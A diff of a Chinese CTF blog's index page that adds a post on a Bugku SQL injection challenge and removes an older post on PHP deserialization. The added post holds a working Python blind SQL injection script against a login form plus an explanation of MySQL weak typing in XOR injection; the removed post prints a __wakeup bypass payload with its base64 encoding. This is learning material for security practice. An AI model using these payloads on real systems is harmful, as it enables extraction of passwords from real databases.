@@ -64,6 +64,51 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-异或注入中字符串的异或-sql的弱类型" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/12/09/%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5%E4%B8%AD%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%BC%82%E6%88%96-sql%E7%9A%84%E5%BC%B1%E7%B1%BB%E5%9E%8B/" class="article-date">
+  <time datetime="2020-12-09T15:37:18.839Z" itemprop="datePublished">2020-12-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/12/09/%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5%E4%B8%AD%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%BC%82%E6%88%96-sql%E7%9A%84%E5%BC%B1%E7%B1%BB%E5%9E%8B/">异或注入中字符串的异或-sql的弱类型</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>今天在bugku上刷到一个叫sql注入2的题。题目过滤了很多保留字，像是and，or，逗号，空格等等。题目用了mid的倒序取反再截取最后一位，再根据uname进行布尔盲注，最后把所有字符再取倒序就得到passwd里的内容。根据特征再md5解密就得到密码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8007&#x2F;web2&#x2F;login.php&#39;</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for i in range(1,40):</span><br><span class="line">	for p in range(32,126):</span><br><span class="line">		sqlstr &#x3D; f&quot;admin&#39;+(ascii(mid(REVERSE(MID((passwd)from(-&#123;i&#125;)))from(-1)))&#x3D;&#123;p&#125;)+&#39;&quot; </span><br><span class="line">		data &#x3D; &#123;</span><br><span class="line">				&#39;uname&#39;:sqlstr,</span><br><span class="line">				&#39;passwd&#39;:&#39;123456&#39;</span><br><span class="line">				&#125;</span><br><span class="line">		html &#x3D; requests.post(url,data&#x3D;data).text</span><br><span class="line">		if &#39;username&#39; in html:</span><br><span class="line">			print (i)</span><br><span class="line">			flag +&#x3D; chr(p)</span><br><span class="line">			print (flag[::-1])</span><br><span class="line">print (&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;&quot;)</span><br><span class="line">print (flag[::-1])</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yiqiushi4748/article/details/93138238?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.control">脚本思路参考网站</a></p>
+<p>但是重点来了，我还看到有用异或进行布尔盲注的(<a target="_blank" rel="noopener" href="https://blog.csdn.net/Mikasa_/article/details/87475337?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.control">网站</a>)，我感到很惊奇，异或注入返回值不是应该只有数字吗（非数字在^中会被当做0），然而用户名却是’admin’，怎么可能用它进行盲注呢？</p>
+<p>我又找了个在线跑sql的网站，发现select ‘admin’^0^’’；明明返回的是0啊，不返回admin那wp里面是怎么用它布尔盲注的??</p>
+<p>最后问了学长才知道，这个登录界面后台可能是用的username=uname，我们uname”‘admin’^0^’’”返回0，<strong>就是username=0，这样是可以爆出全表的。</strong>因为username=0，实际上是<strong>查询所有能解析为0的字符串</strong>。</p>
+<p>而什么字符串可以解析为0呢？注意sql是弱类型，所以以0开头的非纯数字的字符串、空串还有不包含任何数字的字符串都会被解析为0。而如果一个字符串以数字开头而又不是纯数字，那就会被解析为首个数字（以遇到非数字为终止）。（PS:思考一下，一直’abc123’=0成立，’abc’=0成立，为什么’abc123’=’abc’不成立？A:因为前两者的成立是建立在将字符串作为数字解析的前提下，而后者的两个字符串都被当做字符串解析，肯定就不一样了啊。）</p>
+<p>所以看看最后盲注出的flag，发现正好是以0开头的。。。所以这个地方只是凑巧了而已。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/12/09/%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5%E4%B8%AD%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%BC%82%E6%88%96-sql%E7%9A%84%E5%BC%B1%E7%B1%BB%E5%9E%8B/" data-id="ckihob6tf0007xkv0524k2lk4" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-C1CTF2020-WP" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/12/05/C1CTF2020-WP/" class="article-date">
@@ -186,7 +231,7 @@ print(r.text)</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/12/05/C1CTF2020-WP/" data-id="ckih1njm00000bwv03du6fpdk" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/12/05/C1CTF2020-WP/" data-id="ckihob6sl0000xkv0hdnahttf" class="article-share-link">Share</a>
       
       
     </footer>
@@ -258,7 +303,7 @@ print(r.text)</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/12/02/wp-geekchallenge2020/" data-id="ckih1njm80003bwv09zwkajuh" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/12/02/wp-geekchallenge2020/" data-id="ckihob6td0005xkv04wjudzo4" class="article-share-link">Share</a>
       
       
     </footer>
@@ -380,7 +425,7 @@ print(r.text)</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8Cphp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="ckih1njmb0007bwv0ela5cx0d" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/11/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8Cphp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="ckihob6tg0008xkv07wuie71n" class="article-share-link">Share</a>
       
       
     </footer>
@@ -443,7 +488,7 @@ print(r.text)</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/19/python%20requests.session()%E7%9A%84%E7%90%86%E8%A7%A3%E5%92%8Cbase64%E5%9C%A8%E6%AD%A3%E5%88%99%E4%B8%AD%E7%9A%84%E5%BD%A2%E5%BC%8F/" data-id="ckih1njm90004bwv0efp2ft7a" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/11/19/python%20requests.session()%E7%9A%84%E7%90%86%E8%A7%A3%E5%92%8Cbase64%E5%9C%A8%E6%AD%A3%E5%88%99%E4%B8%AD%E7%9A%84%E5%BD%A2%E5%BC%8F/" data-id="ckihob6ta0003xkv0b1b943h8" class="article-share-link">Share</a>
       
       
     </footer>
@@ -581,7 +626,7 @@ print(r.text)</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/11/Hackergame2020-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" data-id="ckih1njmi0009bwv0923ug1sz" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/11/11/Hackergame2020-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" data-id="ckihob6th000axkv0g2xl1vk4" class="article-share-link">Share</a>
       
       
     </footer>
@@ -675,7 +720,7 @@ print(r.text)</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/31/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80--IP-%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81-%E9%BB%98%E8%AE%A4%E7%BD%91%E5%85%B3-DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%AD%A6%E4%B9%A0/" data-id="ckih1njmh0008bwv08dwhgfu0" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/31/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80--IP-%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81-%E9%BB%98%E8%AE%A4%E7%BD%91%E5%85%B3-DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%AD%A6%E4%B9%A0/" data-id="ckihob6tg0009xkv0fa5eaz5h" class="article-share-link">Share</a>
       
       
     </footer>
@@ -759,7 +804,7 @@ print(r.text)</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/20/N1CTF-Web%E7%9A%84%E6%80%BB%E7%BB%93/" data-id="ckih1njm60001bwv06o7y34yb" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/20/N1CTF-Web%E7%9A%84%E6%80%BB%E7%BB%93/" data-id="ckihob6su0001xkv06v3z0b3k" class="article-share-link">Share</a>
       
       
     </footer>
@@ -815,7 +860,7 @@ print(r.text)</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/19/%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93/" data-id="ckih1njmb0006bwv0aoe04g0s" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/19/%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93/" data-id="ckihob6te0006xkv09p1g9ue7" class="article-share-link">Share</a>
       
       
     </footer>
@@ -932,65 +977,7 @@ print(r.text)</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/14/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%BB%E7%BB%93/" data-id="ckih1njm80002bwv06eof7ayj" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-关于PHP序列化和反序列化的漏洞和一些小细节" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/10/08/%E5%85%B3%E4%BA%8EPHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%BB%86%E8%8A%82/" class="article-date">
-  <time datetime="2020-10-08T14:22:20.000Z" itemprop="datePublished">2020-10-08</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/08/%E5%85%B3%E4%BA%8EPHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%BB%86%E8%8A%82/">关于PHP序列化和反序列化的漏洞和一些小细节</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>今天做i春秋的一个题”Web_php_unserialize”，一看到”unserialize”这个词一下子就联想到之前BUU做的那个PHP1中学到的反序列化漏洞，这里先复习一下。</p>
-<h4 id="（一）基础知识"><a href="#（一）基础知识" class="headerlink" title="（一）基础知识"></a>（一）基础知识</h4><p>对象的序列化和反序列化本质是都是基于二进制的，而对象序列化后的结构为</p>
-<p><img src="http://p1.pstatp.com/large/pgc-image/54e12d5dd6c34c46b284e2ac99d44576" alt="img"></p>
-<p>举个很生动的例子，比如</p>
-<p><img src="http://p3.pstatp.com/large/pgc-image/9d5c83d8146a46b7a1a0a51aef7bfcc0" alt="img"></p>
-<p>就拿上面那个图来说，A后面的数字1指的便是类A的唯一一个成员target的序列化。对了，关于O啊，s啊都是什么意思，可以参考<a target="_blank" rel="noopener" href="https://www.php.cn/php-notebook-239422.html">这个网站</a>。</p>
-<p>这里需要注意，这个例子中target是public的，而如果序列化目标是private或者protected的呢？</p>
-<p><img src="http://p3.pstatp.com/large/pgc-image/fc2307de5f69401481102ee1e247da23" alt="img"></p>
-<p>看到上面那张图了么，如果目标被private或者protected修饰的时候，序列化的构造是会发生一些小变化的。</p>
-<h4 id="（二）具体漏洞"><a href="#（二）具体漏洞" class="headerlink" title="（二）具体漏洞"></a>（二）具体漏洞</h4><p>都是来自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ichunqiu/p/10484832.html">这个网站</a>（i春秋nb）</p>
-<p>这里我只实操过前两个。</p>
-<h5 id="1-注入对象构造方法"><a href="#1-注入对象构造方法" class="headerlink" title="(1)注入对象构造方法"></a>(1)注入对象构造方法</h5><p>事实上就是当后台的对象在被调用前发现被反序列化了，那么在构造对象的时候就要直接序列化，具体可以看BUU的那个PHP1，当然”Web_php_unserialize”这个题也牵扯到这个点，不过后者更复杂些而已。</p>
-<h5 id="2-wakeup-绕过"><a href="#2-wakeup-绕过" class="headerlink" title="(2)__wakeup()绕过"></a>(2)__wakeup()绕过</h5><p>反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过wakeup( )的执行。</p>
-<p>“Web_php_unserialize”这个题就是让你练这个的了。</p>
-<p>直接看序列化的字符串:”<strong>O:+4:”Demo”:2:{s:10:”%00Demo%00file”;s:8:”fl4g.php”;}</strong>“(ps:这里+4是绕过正则，而Demo后面的2是为了绕过__wakeup())</p>
-<p>题目原码发现file是经过base64_decode的，所以必须得把上面的字符串先base64加密。然而，问题出现了。</p>
-<p>将上面的payload加密后发现根本读不出flag，去看了大佬的payload解密后发现原来的%00变成了一个莫名其妙的字符，下面是大佬的payload：</p>
-<p><strong>O:+4:”Demo”:3:{s:10:”�Demo�file”;s:8:”fl4g.php”;}</strong></p>
-<p><strong>对应</strong></p>
-<p><strong>TzorNDoiRGVtbyI6Mzp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</strong></p>
-<p>之后我想明白为什么了。在一般的题中，不牵扯base64加解密，直接在网址中输入序列化的字符串，然而url是可以自动识别出%00也就是截断符的。说白了，%00本身就是没法显示出来的，二进制序列化后，截断符就是长得上图那个样。而如果我先base64加密了，url识别的时候是识别的base64加密的东西，%00识别不出来。等到解密的时候，php这么垃圾的语言根本读不出%00是截断符，只会把它当做’%’’0’’0’三个字符。</p>
-<p>那我们咋办啊，之后看了很多大佬的wp豁然开朗。我他妈自己造序列化字符串干啥啊，直接用脚本改就完事了。这里直接上<a target="_blank" rel="noopener" href="https://www.cnblogs.com/gaonuoqi/p/11896281.html">大佬写的脚本</a>，不知道怎么写出能让php认出来的%00，那就不写他，让他自己生成，我把需要改的地方改了不就完事了。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/08/%E5%85%B3%E4%BA%8EPHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%BB%86%E8%8A%82/" data-id="ckih1njma0005bwv05e8hb2a3" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/14/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%BB%E7%BB%93/" data-id="ckihob6sx0002xkv035rd2qn1" class="article-share-link">Share</a>
       
       
     </footer>
@@ -1001,6 +988,11 @@ print(r.text)</code></pre>
 
   
 
+
+  <nav id="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+  </nav>
 
 </section>
         
@@ -1031,6 +1023,10 @@ print(r.text)</code></pre>
       <ul>
         
           <li>
+            <a href="/2020/12/09/%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5%E4%B8%AD%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%BC%82%E6%88%96-sql%E7%9A%84%E5%BC%B1%E7%B1%BB%E5%9E%8B/">异或注入中字符串的异或-sql的弱类型</a>
+          </li>
+        
+          <li>
             <a href="/2020/12/05/C1CTF2020-WP/">C1CTF2020-题解</a>
           </li>
         
@@ -1044,10 +1040,6 @@ print(r.text)</code></pre>
         
           <li>
             <a href="/2020/11/19/python%20requests.session()%E7%9A%84%E7%90%86%E8%A7%A3%E5%92%8Cbase64%E5%9C%A8%E6%AD%A3%E5%88%99%E4%B8%AD%E7%9A%84%E5%BD%A2%E5%BC%8F/">(1)python requests.session()的理解和(2)base64在正则中的形式</a>
-          </li>
-        
-          <li>
-            <a href="/2020/11/11/Hackergame2020-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">Hackergame2020-部分题解</a>
           </li>
         
       </ul>
